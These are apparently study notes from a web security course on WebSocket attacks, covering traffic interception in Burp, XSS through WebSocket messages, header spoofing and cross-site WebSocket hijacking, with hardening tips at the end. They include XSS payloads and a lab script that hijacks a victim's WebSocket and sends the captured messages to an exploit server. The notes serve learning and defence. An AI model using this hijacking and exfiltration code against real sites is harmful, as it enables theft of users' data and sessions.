- They are initiated over HTTP and provide long-lived connections with asynchronous communication in both directions.
- WebSockets are used for all kinds of purposes, including performing user actions and transmitting sensitive information.
- Virtually any web security vulnerability that arises with regular HTTP can also arise in relation to WebSockets communications.
# Manipulating WebSocket traffic
## Intercept and modify WebSocket messages.

- Configure whether client-to-server or server-to-client messages are intercepted in Burp Proxy in the WebSocket interception rules settings.
## Replay and generate new WebSocket messages.

- Do this on repeater. 
## Manipulate WebSocket connections.

- There are various situations in which manipulating the WebSocket handshake might be necessary:

	- It can enable you to reach more attack surface.
	- Some attacks might cause your connection to drop so you need to establish a new one.
	- Tokens or other data in the original handshake request might be stale and need updating.

- You can manipulate the WebSocket handshake using Burp Repeater:

	- Send a WebSocket message to Burp Repeater as already described.
	- In Burp Repeater, click on the pencil icon next to the WebSocket URL. This opens a wizard that lets you attach to an existing connected WebSocket, clone a connected WebSocket, or reconnect to a disconnected WebSocket.
	- If you choose to clone a connected WebSocket or reconnect to a disconnected WebSocket, then the wizard will show full details of the WebSocket handshake request, which you can edit as required before the handshake is performed.
	- When you click "Connect", Burp will attempt to carry out the configured handshake and display the result.
	- If a new WebSocket connection was successfully established, you can then use this to send new messages in Burp Repeater.

# WebSockets security vulnerabilities

- In principle, practically any web security vulnerability might arise in relation to WebSockets:

- User-supplied input transmitted to the server might be processed in unsafe ways, leading to vulnerabilities such as SQL injection or XML external entity injection.
- Some blind vulnerabilities reached via WebSockets might only be detectable using out-of-band (OAST) techniques.
- If attacker-controlled data is transmitted via WebSockets to other application users, then it might lead to XSS or other client-side vulnerabilities.

# Manipulating WebSocket messages to exploit vulnerabilities

- The majority of input-based vulnerabilities affecting WebSockets can be found and exploited by tampering with the contents of WebSocket messages.

- For example, suppose a chat application uses WebSockets to send chat messages between the browser and the server.
- When a user types a chat message, a WebSocket message like the following is sent to the server:
```html
{"message":"Hello Carlos"}
```

- The contents of the message are transmitted (again via WebSockets) to another chat user, and rendered in the user's browser as follows:
```html
<td>Hello Carlos</td>
```

- In this situation, provided no other input processing or defenses are in play, an attacker can perform a proof-of-concept XSS attack by submitting the following WebSocket message:
```html
{"message":"<img src=1 onerror='alert(1)'>"}

# Obfuscated Version
{"message":"<img src=1 oNeRrOr=alert`1`>"}
```

# Manipulating the WebSocket handshake to exploit vulnerabilities

- Misplaced trust in HTTP headers to perform security decisions, such as the X-Forwarded-For header, this way you can also spoof your IP address:  

```
X-Forwarded-For: 1.1.1.1
```

- Flaws in session handling mechanisms, since the session context in which WebSocket messages are processed is generally determined by the session context of the handshake message.
- Attack surface introduced by custom HTTP headers used by the application.

# Using cross-site WebSockets to exploit vulnerabilities

- Some WebSockets security vulnerabilities arise when an attacker makes a cross-domain WebSocket connection from a web site that the attacker controls.
- This is known as a cross-site WebSocket hijacking attack, and it involves exploiting a cross-site request forgery (CSRF) vulnerability on a WebSocket handshake.
- The attack often has a serious impact, allowing an attacker to perform privileged actions on behalf of the victim user or capture sensitive data to which the victim user has access.
## What is cross-site WebSocket hijacking?

- Cross-site WebSocket hijacking (also known as cross-origin WebSocket hijacking) involves a cross-site request forgery (CSRF) vulnerability on a WebSocket handshake. It arises when the WebSocket handshake request relies solely on HTTP cookies for session handling and does not contain any CSRF tokens or other unpredictable values.

- An attacker can create a malicious web page on their own domain which establishes a cross-site WebSocket connection to the vulnerable application. The application will handle the connection in the context of the victim user's session with the application.

- The attacker's page can then send arbitrary messages to the server via the connection and read the contents of messages that are received back from the server. This means that, unlike regular CSRF, the attacker gains two-way interaction with the compromised application.

## What is the impact of cross-site WebSocket hijacking?

- A successful cross-site WebSocket hijacking attack will often enable an attacker to:

- Perform unauthorized actions masquerading as the victim user. As with regular CSRF, the attacker can send arbitrary messages to the server-side application. If the application uses client-generated WebSocket messages to perform any sensitive actions, then the attacker can generate suitable messages cross-domain and trigger those actions.

- Retrieve sensitive data that the user can access. Unlike with regular CSRF, cross-site WebSocket hijacking gives the attacker two-way interaction with the vulnerable application over the hijacked WebSocket. If the application uses server-generated WebSocket messages to return any sensitive data to the user, then the attacker can intercept those messages and capture the victim user's data.

# Performing a cross-site WebSocket hijacking attack

- Since a cross-site WebSocket hijacking attack is essentially a CSRF vulnerability on a WebSocket handshake, the first step to performing an attack is to review the WebSocket handshakes that the application carries out and determine whether they are protected against CSRF.

- In terms of the normal conditions for CSRF attacks, you typically need to find a handshake message that relies solely on HTTP cookies for session handling and doesn't employ any tokens or other unpredictable values in request parameters.

- For example, the following WebSocket handshake request is probably vulnerable to CSRF, because the only session token is transmitted in a cookie:
```
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```

- The `Sec-WebSocket-Key` header contains a random value to prevent errors from caching proxies, and is not used for authentication or session handling purposes.

### Possible vulnerabilities

1. session cookie `SameSite=None`
2. /endpoint vulnerable to CSRF
3. Websockets reply entire chat history on READY message

### Burp Suite lab Payload

```javascript
<script>
var ws = new WebSocket(
    "wss://0aa800ec03b36bde8016e900007e0039.web-security-academy.net/chat"
);
ws.onopen = function() {
    ws.send("READY")
}
ws.onmessage = function(event) {
    fetch(
        "https://exploit-0aa9001403866bd6807ae8e501f60039.exploit-server.net/exploit?message=" + btoa(event.data)
    );
};
</script>
```

- If the WebSocket handshake request is vulnerable to CSRF, then an attacker's web page can perform a cross-site request to open a WebSocket on the vulnerable site. What happens next in the attack depends entirely on the application's logic and how it is using WebSockets. The attack might involve:

	- Sending WebSocket messages to perform unauthorized actions on behalf of the victim user.
	- Sending WebSocket messages to retrieve sensitive data.
	- Sometimes, just waiting for incoming messages to arrive containing sensitive data.
## How to secure a WebSocket connection

- To minimize the risk of security vulnerabilities arising with WebSockets, use the following guidelines:

1. Use the wss:// protocol (WebSockets over TLS).
2. Hard code the URL of the WebSockets endpoint, and certainly don't incorporate user-controllable data into this URL.
3. Protect the WebSocket handshake message against CSRF, to avoid cross-site WebSockets hijacking vulnerabilities.
4. Treat data received via the WebSocket as untrusted in both directions. Handle data safely on both the server and client ends, to prevent input-based vulnerabilities such as SQL injection and cross-site scripting.